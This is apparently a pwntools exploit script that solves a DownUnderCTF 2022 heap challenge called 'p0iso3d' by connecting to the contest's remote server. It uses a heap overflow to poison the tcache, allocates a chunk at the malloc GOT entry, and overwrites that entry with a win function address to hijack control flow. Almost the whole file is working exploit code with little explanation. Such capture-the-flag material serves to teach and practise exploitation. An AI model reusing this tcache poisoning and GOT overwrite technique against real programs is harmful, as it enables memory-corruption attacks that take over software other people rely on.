#!/usr/bin/env python3

from venv import create
from pwn import *

context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# no pie, no fullrelro
# tcache poison to allcaote at malloc got entry, edit to overwrite win address, trigger malloc

BIN = './p0iso3d'
LIBC = './libc.so.6'


malloc_got = 0x404058
printf_got = 0x404040
win = 0x4017ad

# p = process(BIN, env={"LD_PRELOAD":"./libc-2.27.so"})
p =remote("2022.ductf.dev", 30024)

def create(idx: string, data=b''):
    p.recvuntil("choice:")
    p.sendline(b'1')
    p.recvuntil('index:')
    p.sendline(idx)
    p.recvuntil("data:")
    p.sendline(data)

def edit(idx: string, data=b''):
    p.recvuntil("choice:")
    p.sendline(b'3')
    p.recvuntil('index:')
    p.sendline(idx)
    p.recvuntil("data:")
    p.sendline(data)

def delete(idx: string):
    p.recvuntil("choice:")
    p.sendline(b'4')
    p.recvuntil('index:')
    p.sendline(idx)

def read(idx):
    p.recvuntil("choice:")
    p.sendline(b'2')
    p.recvuntil('index:')
    p.sendline(idx)

    p.recvline()
    p.recvline()
    p.recvline()


# allocate new chunk at malloc got entry
create(b'0')
create(b'1')
create(b'2')

delete(b'2')
delete(b'1')

#gdb.attach(p)

payload = b'A'*(128+8+8) + p64(malloc_got)
edit(b'0', payload)

create(b'2')
create(b'1') # 1 should point to got entry

edit(b'1', p64(win))
delete(b'0')
create(b'0')
